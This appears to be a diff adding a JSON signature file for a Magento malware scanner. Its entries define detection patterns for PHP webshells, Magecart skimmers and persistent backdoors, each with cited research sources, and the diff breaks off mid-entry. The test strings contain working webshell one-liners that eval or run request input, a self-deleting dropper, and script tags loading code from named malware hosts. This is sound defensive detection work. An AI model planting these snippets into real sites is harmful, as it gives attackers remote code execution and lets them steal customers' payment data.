@@ -1,0 +1,1725 @@
+{
+    "version": "2026.10.06",
+    "signatures": [
+        {
+            "id": "webshell-eval-base64",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
+            "name": "eval() of base64-decoded PHP",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "eval(base64_decode(",
+            "description": "Classic webshell obfuscation: decode a base64 payload and eval() it directly. Legitimate code essentially never does this.",
+            "test_should_match": [
+                "<?php eval(base64_decode($_POST['x'])); ?>"
+            ],
+            "test_should_not_match": [
+                "<?php $decoded = base64_decode($value); echo htmlspecialchars($decoded); ?>"
+            ]
+        },
+        {
+            "id": "webshell-eval-gzinflate",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
+            "name": "eval() of gzinflate-decompressed PHP",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "eval(gzinflate(",
+            "description": "Same obfuscation pattern as webshell-eval-base64 using gzinflate instead of/alongside base64 to compress the payload.",
+            "test_should_match": [
+                "<?php eval(gzinflate(base64_decode('Hc...'))); ?>"
+            ],
+            "test_should_not_match": [
+                "<?php $data = gzinflate($compressed); file_put_contents($log, $data); ?>"
+            ]
+        },
+        {
+            "id": "webshell-assert-request",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
+            "name": "assert() of raw request input",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/assert\\s*\\(\\s*\\$_(POST|REQUEST|GET)/",
+            "description": "assert() historically evaluated its string argument as PHP code - passing request input directly to it is a remote-code-execution webshell pattern, not something legitimate code does.",
+            "test_should_match": [
+                "<?php assert($_POST['cmd']); ?>",
+                "<?php assert( $_REQUEST[1] ); ?>"
+            ],
+            "test_should_not_match": [
+                "<?php assert($user->isValid()); ?>"
+            ]
+        },
+        {
+            "id": "webshell-exec-request",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
+            "name": "Shell execution of raw request input",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/(system|passthru|shell_exec|proc_open|popen)\\s*\\(\\s*\\$_(POST|REQUEST|GET)/",
+            "description": "Passes request input directly to a shell-execution function - the defining trait of a command-execution webshell.",
+            "test_should_match": [
+                "<?php system($_GET['c']); ?>",
+                "<?php shell_exec($_REQUEST['cmd']); ?>"
+            ],
+            "test_should_not_match": [
+                "<?php system('php-fpm-reload'); ?>"
+            ]
+        },
+        {
+            "id": "webshell-known-names",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
+            "name": "Known public webshell family marker",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/(c99shell|r57shell|FilesMan|WSO\\s?[Ss]hell)/",
+            "description": "Literal name/marker strings used by long-documented, widely-reused public webshell families. Presence alone is a strong signal regardless of the surrounding code.",
+            "test_should_match": [
+                "<?php // FilesMan webshell v3.2 ?>",
+                "<title>WSO Shell 2.5</title>"
+            ],
+            "test_should_not_match": [
+                "<?php // regular file manager, nothing shell-related ?>"
+            ]
+        },
+        {
+            "id": "magecart-atob-eval",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
+            "name": "eval() of base64-decoded script content",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "eval(atob(",
+            "description": "Decodes a base64 string and eval()s it inline - the same obfuscation technique as webshell-eval-base64, applied to injected storefront JavaScript (a common Magecart/skimmer loader pattern) rather than PHP.",
+            "test_should_match": [
+                "<script>eval(atob('ZG9jdW1lbnQ='))</script>"
+            ],
+            "test_should_not_match": [
+                "<script>var decoded = atob(encodedValue); console.log(decoded);</script>"
+            ]
+        },
+        {
+            "id": "magecart-charcode-script-build",
+            "source": "https://github.com/StackNuts/magento-stackgauge-security/blob/main/etc/signatures.json",
+            "name": "Script tag assembled via String.fromCharCode",
+            "severity": "warning",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "String.fromCharCode",
+            "description": "A common way to build a <script> tag or URL character-by-character to dodge simple string-matching defenses. Flagged as a warning, not critical, on its own - legitimate code can use String.fromCharCode for unrelated reasons, so this is a signal worth a human look rather than proof by itself.",
+            "test_should_match": [
+                "<script>var s=String.fromCharCode(60,115,99,114,105,112,116);</script>"
+            ],
+            "test_should_not_match": [
+                "<p>Copyright &copy; 2026 Example Store</p>"
+            ]
+        },
+        {
+            "id": "polyshell-gif89a-php-polyglot",
+            "name": "PHP payload hidden after a GIF89a header (PolyShell polyglot)",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/^GIF89a[\\s\\S]{0,4096}?<\\?(?:php|=)/",
+            "description": "PolyShell (APSB25-94) webshells are GIF89a images with PHP appended, uploaded through the Magento REST API and stored under pub/media.",
+            "source": "https://sansec.io/research/magento-polyshell",
+            "test_should_match": [
+                "GIF89a;<?php echo 'probe'; ?>"
+            ],
+            "test_should_not_match": [
+                "GIF89a plain image data with no script tags"
+            ]
+        },
+        {
+            "id": "magecart-svg-onload-atob",
+            "name": "Base64 skimmer hidden in an SVG onload handler",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/<svg[^>]*\\bonload\\s*=[^>]*\\batob\\s*\\(/i",
+            "description": "Magecart technique: a 1x1 SVG element runs base64-decoded script from its onload attribute to evade scanners.",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "test_should_match": [
+                "<svg width=\"1\" height=\"1\" onload=\"eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))\"></svg>"
+            ],
+            "test_should_not_match": [
+                "<svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\"><path d=\"M0 0h24v24H0z\"/></svg>"
+            ]
+        },
+        {
+            "id": "stylesmuggler-cookie-marker",
+            "name": "StylesSmuggler injected block checking gl_google_advisor cookie",
+            "severity": "critical",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "gl_google_advisor_",
+            "description": "Cookie checked by the CVE-2026-75650 StylesSmuggler payload before it fetches and includes remote PHP. Source: https://sansec.io/research/stylesmuggler-0day",
+            "source": "https://sansec.io/research/stylesmuggler-0day",
+            "test_should_match": [
+                "<?php if (isset($_COOKIE['gl_google_advisor_824808'])) { /* probe */ } ?>"
+            ],
+            "test_should_not_match": [
+                "<?php if (isset($_COOKIE['session_id'])) { /* probe */ } ?>"
+            ]
+        },
+        {
+            "id": "magecart-xhr-prototype-override",
+            "name": "XMLHttpRequest prototype override (request interception)",
+            "severity": "warning",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/XMLHttpRequest\\.prototype\\.(?:open|send)\\s*=/",
+            "description": "Skimmers override XHR send/open to read payment requests as they leave the page. Some legitimate monitoring and polyfill scripts do this too, so this is a warning for review. Source: https://sansec.io/research/svg-onload-magecart-skimmer",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "test_should_match": [
+                "XMLHttpRequest.prototype.send = function (body) { steal(body); };"
+            ],
+            "test_should_not_match": [
+                "var x = new XMLHttpRequest(); x.open('GET', '/api');"
+            ]
+        },
+        {
+            "id": "webshell-eval-strrev-post",
+            "name": "eval() of reversed POST input (obfuscated webshell)",
+            "severity": "critical",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/eval\\s*\\(\\s*\\$\\w+\\s*\\(\\s*strrev\\s*\\(\\s*\\$_POST/",
+            "description": "Webshell that reverses a POST value and passes it to a base64 decoder inside eval(). The function name is often split into string fragments to evade literal matching. Source: https://sansec.io/research/magento-xml-backdoor",
+            "source": "https://sansec.io/research/magento-xml-backdoor",
+            "test_should_match": [
+                "<?php @eval($f(strrev($_POST[\"x\"]))); ?>"
+            ],
+            "test_should_not_match": [
+                "<?php echo strrev($_POST[\"x\"]); ?>"
+            ]
+        },
+        {
+            "id": "magecart-checkout-only-trigger",
+            "name": "Script that runs only on checkout pages (not cart)",
+            "severity": "warning",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/location\\.href\\.includes\\(\\s*['\"]checkout['\"]\\s*\\)\\s*&&\\s*!window\\.location\\.href\\.includes\\(\\s*['\"]cart['\"]\\s*\\)/",
+            "description": "Skimmers often activate only on checkout URLs and skip cart pages. Heuristic: warns for review rather than blocking. Source: https://blog.sucuri.net/2024/11/credit-card-skimmer-malware-targeting-magento-checkout-pages.html",
+            "source": "https://blog.sucuri.net/2024/11/credit-card-skimmer-malware-targeting-magento-checkout-pages.html",
+            "test_should_match": [
+                "if (window.location.href.includes('checkout') && !window.location.href.includes('cart')) { init(); }"
+            ],
+            "test_should_not_match": [
+                "if (window.location.href.includes('product')) { init(); }"
+            ]
+        },
+        {
+            "id": "magecart-homoglyph-analytics-domain",
+            "name": "Lookalike google-analytics domain using a non-ASCII character",
+            "severity": "critical",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/google-analyt[^\\x00-\\x7f]/",
+            "description": "Skimmer script hosted on a google-analytics lookalike that replaces one letter with a non-ASCII homoglyph. Source: https://blog.sucuri.net/2019/07/fake-google-domains-used-in-evasive-magento-skimmer.html",
+            "source": "https://blog.sucuri.net/2019/07/fake-google-domains-used-in-evasive-magento-skimmer.html",
+            "test_should_match": [
+                "<script src=\"//google-analyt\u00eecs.com/x.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"//www.google-analytics.com/analytics.js\"></script>"
+            ]
+        },
+        {
+            "id": "interceptor-init-post-eval",
+            "name": "Backdoor injected into a generated Magento Interceptor class",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-xml-backdoor",
+            "target": [
+                "generated_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/___init\\(\\);\\s*if\\s*\\(\\s*isset\\s*\\(\\s*\\$_POST\\s*\\[\\s*['\"][0-9a-f]{10}['\"]\\s*\\]\\s*\\)\\s*\\)\\s*\\{[\\s\\S]{0,300}?eval/",
+            "description": "Persistence backdoor added to a generated Interceptor class by a sed command, so it survives cache rebuilds. Lives under generated/code/, which no other target covers. Source: https://sansec.io/research/magento-xml-backdoor",
+            "test_should_match": [
+                "___init();\n if (isset($_POST[\"7faa27b473\"])) { @eval($c(strrev($_POST[\"7faa27b473\"]))); exit(0); }"
+            ],
+            "test_should_not_match": [
+                "___init();\n return parent::execute();"
+            ]
+        },
+        {
+            "id": "magecart-atob-regexp-page-gate",
+            "name": "Skimmer loader gated by a base64-decoded URL regex",
+            "severity": "critical",
+            "source": "https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/if\\s*\\(\\s*l\\.href\\.match\\(\\s*new RegExp\\(\\s*atob\\(/",
+            "description": "Skimmer loader that only fires on pages whose URL matches a base64-decoded pattern (commonly checkout). The decoded pattern hides the target page from static review.",
+            "test_should_match": [
+                "if (l.href.match(new RegExp(atob(o)))) { load(); }"
+            ],
+            "test_should_not_match": [
+                "if (l.href.match(/checkout/)) { load(); }"
+            ]
+        },
+        {
+            "id": "webshell-sha256-gated-eval",
+            "name": "PHP webshell that runs eval() only after a SHA-256 key check",
+            "severity": "critical",
+            "source": "https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/hash\\(\\s*[\"']sha256[\"']\\s*,\\s*get_data\\s*\\(/",
+            "description": "PHP webshell that hashes a request parameter with sha256 and compares it to a fixed prefix before decoding and eval()-ing a second parameter. The key check keeps it hidden from casual visitors. Source: the Sucuri GTM skimmer post above.",
+            "test_should_match": [
+                "if (strpos(hash(\"sha256\", get_data(\"item\", \"\")), \"abc\") === false) return \"\";"
+            ],
+            "test_should_not_match": [
+                "$digest = hash(\"sha256\", $file_contents);"
+            ]
+        },
+        {
+            "id": "xml-backdoor-post-parameter",
+            "name": "POST parameter used by the generated Interceptor backdoor",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-xml-backdoor",
+            "target": [
+                "generated_php",
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "7faa27b473",
+            "description": "Request parameter name used by the persistent backdoor that a sed command injects into generated Magento Interceptor classes. Source: Sansec, Persistent Magento backdoor hidden in XML.",
+            "test_should_match": [
+                "if (isset($_POST[\"7faa27b473\"])) { exit; }"
+            ],
+            "test_should_not_match": [
+                "if (isset($_POST[\"email\"])) { exit; }"
+            ]
+        },
+        {
+            "id": "cosmicsting-websocket-base64",
+            "name": "Base64-encoded WebSocket endpoint in skimmer code",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting-fallout",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "d3NzOi8vamd1ZXVyeXN0YXRpYy54eXo",
+            "description": "Base64 of a WebSocket URL to a skimmer command host, seen in CosmicSting-era skimmer code. Source: Sansec, CosmicSting fallout.",
+            "test_should_match": [
+                "var u = atob(\"d3NzOi8vamd1ZXVyeXN0YXRpYy54eXo=\");"
+            ],
+            "test_should_not_match": [
+                "var u = atob(\"aHR0cHM6Ly9leGFtcGxlLmNvbQ==\");"
+            ]
+        },
+        {
+            "id": "webshell-base64-eval-obfuscated",
+            "name": "Obfuscated eval(base64_decode()) built from base64 text",
+            "severity": "critical",
+            "source": "https://www.mgt-commerce.com/blog/magento-sitescanner-malware/",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "ZXZhbChiYXNlNjRfZGV",
+            "description": "Base64 prefix of eval(base64_de, used to hide the eval call inside a second base64 layer. Source: MGT Commerce, Magento SiteScanner malware.",
+            "test_should_match": [
+                "$x = base64_decode(\"ZXZhbChiYXNlNjRfZGVj\");"
+            ],
+            "test_should_not_match": [
+                "$x = base64_decode(\"aGVsbG8=\");"
+            ]
+        },
+        {
+            "id": "template-attack-cryption-block",
+            "name": "Base64 cryption block from the Magento template attack",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-template-attacks",
+            "target": [
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "JGYwPWZhbHNlO2lmKGlzc2V0",
+            "description": "Base64 prefix of a PHP block that sets a flag and checks a request key before running code. Source: Sansec, Magento 2 template attacks.",
+            "test_should_match": [
+                "$c = base64_decode(\"JGYwPWZhbHNlO2lmKGlzc2V0KCR3MSk=\");"
+            ],
+            "test_should_not_match": [
+                "$c = base64_decode(\"SGVsbG8gd29ybGQ=\");"
+            ]
+        },
+        {
+            "id": "template-attack-post-ata-decode",
+            "name": "Decodes a POST value straight into eval",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-template-attacks",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "base64_decode($_POST[\"ata\"])",
+            "description": "Webshell line that base64-decodes a POST parameter and evals it, from the template attack write-up. Source: Sansec, Magento 2 template attacks.",
+            "test_should_match": [
+                "$v = base64_decode($_POST[\"ata\"]);"
+            ],
+            "test_should_not_match": [
+                "$v = base64_decode($_POST[\"data\"]);"
+            ]
+        },
+        {
+            "id": "svg-skimmer-localstorage-marker",
+            "name": "Skimmer localStorage marker _mgx_cv",
+            "severity": "critical",
+            "source": "https://sansec.io/research/svg-onload-magecart-skimmer",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "_mgx_cv",
+            "description": "localStorage key the SVG-onload skimmer sets so it does not run twice. Source: Sansec, SVG onload Tag hides Magecart skimmer.",
+            "test_should_match": [
+                "localStorage.setItem('_mgx_cv', '1');"
+            ],
+            "test_should_not_match": [
+                "localStorage.setItem('cart_id', '1');"
+            ]
+        },
+        {
+            "id": "crs-955110-r57-shell",
+            "name": "r57 web shell page title",
+            "severity": "critical",
+            "source": "https://raw.githubusercontent.com/coreruleset/coreruleset/main/rules/RESPONSE-955-WEB-SHELLS.conf",
+            "target": [
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/<title>r57 shell<\\/title>/i",
+            "description": "Title of the r57 PHP web shell page. Rule 955110 from OWASP CoreRuleSet (Apache-2.0).",
+            "test_should_match": [
+                "<html><title>r57 shell</title><body>"
+            ],
+            "test_should_not_match": [
+                "<title>Shell prices for garden tools</title>"
+            ]
+        },
+        {
+            "id": "crs-955140-mini-shell",
+            "name": "Mini Shell web shell page",
+            "severity": "critical",
+            "source": "https://raw.githubusercontent.com/coreruleset/coreruleset/main/rules/RESPONSE-955-WEB-SHELLS.conf",
+            "target": [
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/<title>Mini Shell<\\/title>/i",
+            "description": "Title of the Mini Shell PHP web shell page. Rule 955140 from OWASP CoreRuleSet (Apache-2.0).",
+            "test_should_match": [
+                "<title>Mini Shell</title>"
+            ],
+            "test_should_not_match": [
+                "<title>Mini Shopping Cart</title>"
+            ]
+        },
+        {
+            "id": "crs-955150-ashiyane-shell",
+            "name": "Ashiyane web shell page title",
+            "severity": "critical",
+            "source": "https://raw.githubusercontent.com/coreruleset/coreruleset/main/rules/RESPONSE-955-WEB-SHELLS.conf",
+            "target": [
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/<title>\\.:: [^~]*~ Ashiyane V [0-9.]+ ::\\.<\\/title>/",
+            "description": "Title of the Ashiyane PHP web shell page. Rule 955150 from OWASP CoreRuleSet (Apache-2.0).",
+            "test_should_match": [
+                "<title>.:: root@host ~ Ashiyane V 1.2 ::.</title>"
+            ],
+            "test_should_not_match": [
+                "<title>Ashiyane Garden Centre</title>"
+            ]
+        },
+        {
+            "id": "gtm-img-onerror-loader",
+            "name": "GTM loader hidden in an img onerror handler",
+            "severity": "critical",
+            "source": "https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/<img src=\"google-manager\\.png\" onerror=\"\\(function\\(w,d,s,l,i\\)/",
+            "description": "A fake image whose onerror handler loads Google Tag Manager, so the skimmer looks like normal tag code. Legitimate GTM uses a script or noscript iframe, not an image error handler.",
+            "test_should_match": [
+                "<img src=\"google-manager.png\" onerror=\"(function(w,d,s,l,i){w[l]=w[l]||[];"
+            ],
+            "test_should_not_match": [
+                "<img src=\"logo.png\" alt=\"Logo\" onerror=\"this.src='/fallback.png'\">"
+            ]
+        },
+        {
+            "id": "skimmer-websocket-loader-base64",
+            "name": "Base64 WebSocket loader in skimmer script",
+            "severity": "critical",
+            "source": "https://blog.sucuri.net/2025/02/google-tag-manager-skimmer-steals-credit-card-info-from-magento-site.html",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "d2luZG93Lnd3ID0gbmV3IFdlYlNvY2tldCgo",
+            "description": "Base64 prefix of 'window.ww = new WebSocket((' , the start of the loader that opens a command channel to the skimmer's server.",
+            "test_should_match": [
+                "'d2luZG93Lnd3ID0gbmV3IFdlYlNvY2tldCgoJ3dzczovL2V1cm93ZWJtb25p'"
+            ],
+            "test_should_not_match": [
+                "'aGVsbG8gd29ybGQ='"
+            ]
+        },
+        {
+            "id": "parasite-hardcoded-key-eval",
+            "name": "Backdoor gated by a hard-coded key, then eval",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-persistent-parasite",
+            "target": [
+                "generated_php",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "ceedf557f7e6acb1f0025c07df235c555e2d9d808e7f6e6e64825a3d5bb2ee6d",
+            "description": "Hard-coded key that gates a backdoor in a generated Interceptor class: request content is base64-decoded and eval()-ed when the key matches. Source: Sansec, Magento 2 persistent parasite.",
+            "test_should_match": [
+                "$productKey == \"ceedf557f7e6acb1f0025c07df235c555e2d9d808e7f6e6e64825a3d5bb2ee6d\""
+            ],
+            "test_should_not_match": [
+                "$productKey == \"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\""
+            ]
+        },
+        {
+            "id": "parasite-concatenated-base64-decode",
+            "name": "base64_decode hidden by string concatenation",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-persistent-parasite",
+            "target": [
+                "generated_php",
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\"base\"\\s*\\.\\s*\"64_de\"\\s*\\.\\s*\"code\"/",
+            "description": "Builds the function name base64_decode from fragments so that static scanners miss it, then decodes data for eval(). Source: Sansec, Magento 2 persistent parasite.",
+            "test_should_match": [
+                "$pr_func  = \"base\". \"64_de\".\"code\";"
+            ],
+            "test_should_not_match": [
+                "$pr_func = \"base64_decode\";"
+            ]
+        },
+        {
+            "id": "parasite-vendor-path-param",
+            "name": "Backdoor request parameter VENDOR_NEW_PATH_MAGE",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-persistent-parasite",
+            "target": [
+                "generated_php",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "VENDOR_NEW_PATH_MAGE",
+            "description": "Request parameter that carries the encoded payload of the persistent parasite backdoor. Source: Sansec, Magento 2 persistent parasite.",
+            "test_should_match": [
+                "isset($_POST['VENDOR_NEW_PATH_MAGE'])"
+            ],
+            "test_should_not_match": [
+                "isset($_POST['vendor_name'])"
+            ]
+        },
+        {
+            "id": "webshell-preg-replace-eval-modifier",
+            "name": "preg_replace /e modifier used to eval a payload",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-breach-analysis",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/preg_replace\\(\\s*[\"']\\/\\.\\*\\/e[\"']/",
+            "description": "The /e modifier of preg_replace evaluates its replacement as PHP. Removed in PHP 7, so any use in a Magento store is a webshell pattern. Source: Sansec, Magento breach analysis (a webshell found at media/tmp).",
+            "test_should_match": [
+                "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\""
+            ],
+            "test_should_not_match": [
+                "preg_replace(\"/\\s+/\", \" \", $text);"
+            ]
+        },
+        {
+            "id": "parasite-plugin-info-decode",
+            "name": "Serialized payload wrapped in plugInfo then base64-decoded",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-persistent-parasite",
+            "target": [
+                "generated_php",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "'\"plugInfo\";' . base64_decode",
+            "description": "Prefixes decoded request content with a plugInfo serialization header and unserializes it through the PhpCode adapter, which evals. Source: Sansec, Magento 2 persistent parasite.",
+            "test_should_match": [
+                "$data = '\"plugInfo\";' . base64_decode($productContents);"
+            ],
+            "test_should_not_match": [
+                "$data = '\"config\";' . base64_decode($productContents);"
+            ]
+        },
+        {
+            "id": "webshell-md5-hash-gated-system",
+            "name": "Webshell gated by a hard-coded MD5 hash, then system()",
+            "severity": "critical",
+            "source": "https://sansec.io/research/sessionreaper",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "4009d3fa8132195a2dab4dfa3affc8d2",
+            "description": "Hard-coded MD5 of a double-hashed password that gates a PHP webshell which runs system() on the cmd parameter. Source: Sansec, SessionReaper.",
+            "test_should_match": [
+                "if (!hash_equals('4009d3fa8132195a2dab4dfa3affc8d2', md5(md5($_REQUEST['pass'] ?? '')))) {"
+            ],
+            "test_should_not_match": [
+                "if (!hash_equals('0123456789abcdef0123456789abcdef', md5($token))) {"
+            ]
+        },
+        {
+            "id": "webshell-cookie-hash-gated-eval",
+            "name": "Webshell gated by a cookie hash, then eval()",
+            "severity": "critical",
+            "source": "https://sansec.io/research/sessionreaper",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "17028f487cb2a84607646da3ad3878ec",
+            "description": "Hard-coded MD5 that a cookie must match before a webshell evals the id parameter. Source: Sansec, SessionReaper.",
+            "test_should_match": [
+                "if(md5($_COOKIE['d'])=='17028f487cb2a84607646da3ad3878ec'){"
+            ],
+            "test_should_not_match": [
+                "if(md5($_COOKIE['d'])=='0123456789abcdef0123456789abcdef'){"
+            ]
+        },
+        {
+            "id": "sessionreaper-cookie-payload-param",
+            "name": "Serialized cookie payload parameter ZnFDBN",
+            "severity": "critical",
+            "source": "https://sansec.io/research/sessionreaper",
+            "target": [
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "ZnFDBN",
+            "description": "Request parameter that carries eval() input from the SessionReaper serialized payload planted in pub/errors/404.php. Source: Sansec, SessionReaper.",
+            "test_should_match": [
+                "if(isset($_POST['ZnFDBN'])){eval($_POST['ZnFDBN']);}"
+            ],
+            "test_should_not_match": [
+                "if(isset($_POST['email'])){eval($_POST['email']);}"
+            ]
+        },
+        {
+            "id": "webshell-self-deleting-one-liner",
+            "name": "Self-deleting PHP one-liner dropper",
+            "severity": "critical",
+            "source": "https://sansec.io/research/sessionreaper",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/<\\?php echo '[A-Za-z0-9]{6}'; ; unlink\\(__FILE__\\);\\?>/",
+            "description": "A short PHP file that prints a token and deletes itself, used to test or hide a dropped file. Source: Sansec, SessionReaper.",
+            "test_should_match": [
+                "<?php echo 'AEMgzb'; ; unlink(__FILE__);?>a"
+            ],
+            "test_should_not_match": [
+                "<?php echo 'Hello'; ?>"
+            ]
+        },
+        {
+            "id": "webshell-xor-string-eval",
+            "name": "eval of a string assembled by XOR of constants",
+            "severity": "critical",
+            "source": "https://sansec.io/research/sessionreaper",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\(\\s*\"[A-Za-z0-9]{3,5}\"\\s*\\^\\s*\"[A-Za-z0-9]{3,5}\"\\s*\\^\\s*\"[A-Za-z0-9]{3,5}\"\\s*\\)/",
+            "description": "Builds a PHP function name or payload by XOR-ing string constants, so the source is hidden from static review. Source: Sansec, SessionReaper.",
+            "test_should_match": [
+                "$xor = (\"Jm7r\" ^ \"Dvof\" ^ \"km9x\") . (\"Ta\" ^ \"D1\" ^ \"8t\");"
+            ],
+            "test_should_not_match": [
+                "$flags = (\"READ\" | \"WRITE\");"
+            ]
+        },
+        {
+            "id": "brevo-appended-sendibt-loader",
+            "name": "Appended loader injecting sendibt1 f.js into Brevo SDK",
+            "severity": "critical",
+            "source": "https://sansec.io/research/brevo-supply-chain-attack",
+            "target": [
+                "pub_php",
+                "design_config",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": ";(function(){var s=document.createElement(\"script\");s.src=\"https://cdn2.sendibt1.com/f.js\";",
+            "description": "Matches the one-line IIFE appended to the final line of a compromised Brevo conversations/SDK script, which injects a script from the sendibt1.com malware host. The IIFE shape with this exact host path is specific to the injected code. Source: Sansec, Brevo supply chain attack.",
+            "test_should_match": [
+                ";(function(){var s=document.createElement(\"script\");s.src=\"https://cdn2.sendibt1.com/f.js\";"
+            ],
+            "test_should_not_match": [
+                ";(function(){var s=document.createElement(\"script\");s.src=\"https://cdn.brevo.com/js/sdk.js\";"
+            ]
+        },
+        {
+            "id": "brevo-sendibt-f-js-script-tag",
+            "name": "sendibt1 f.js loader script tag",
+            "severity": "critical",
+            "source": "https://sansec.io/research/brevo-supply-chain-attack",
+            "target": [
+                "design_config",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "<script src=\"https://cdn9.sendibt1.com/f.js\" async data-cfasync=\"false\"></script>",
+            "description": "Matches the HTML script tag that loads the Brevo-campaign kit loader f.js from the cdn9.sendibt1.com host, including the data-cfasync attribute used by the kit. Source: Sansec, Brevo supply chain attack.",
+            "test_should_match": [
+                "<script src=\"https://cdn9.sendibt1.com/f.js\" async data-cfasync=\"false\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://cdn.brevo.com/js/sdk-loader.js\" async></script>"
+            ]
+        },
+        {
+            "id": "clickfix-windlrr-loader-script-tag",
+            "name": "ClickFix windlrr.com loader script tag",
+            "severity": "critical",
+            "source": "https://sansec.io/research/clickfix-clipboard-hijacker",
+            "target": [
+                "design_config",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "<script data-cfasync=\"false\" async src=\"https://windlrr.com/file.js\"></script>",
+            "description": "Matches the script tag placed in the HTML head by the ClickFix clipboard hijacker loader, as reported on a DoD vendor homepage. The exact tag with data-cfasync and the windlrr.com source is specific to this campaign. Source: Sansec, ClickFix malware hits DoD cybersecurity vendor homepage.",
+            "test_should_match": [
+                "<script data-cfasync=\"false\" async src=\"https://windlrr.com/file.js\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script async src=\"https://www.googletagmanager.com/gtm.js\"></script>"
+            ]
+        },
+        {
+            "id": "clickfix-postmessage-clipboard-hijack",
+            "name": "ClickFix postMessage hijack that writes clipboard",
+            "severity": "critical",
+            "source": "https://sansec.io/research/clickfix-clipboard-hijacker",
+            "target": [
+                "design_config",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
